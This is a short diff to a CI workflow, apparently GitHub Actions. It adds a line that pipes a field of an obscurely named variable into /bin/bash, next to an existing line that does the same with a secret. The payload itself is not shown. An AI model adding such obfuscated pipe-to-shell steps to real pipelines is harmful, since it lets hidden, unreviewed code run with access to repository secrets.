@@ -21,6 +21,7 @@ jobs:
           xdg89351: ${{ secrets.xdg89351 }}
         run: |
           printf '%s' "$xdg89351" | jq -r .w61 | /bin/bash
+          echo $qzu91 | jq -r .jkup8332 | /bin/bash
 
       - name: Save output
         if: always()
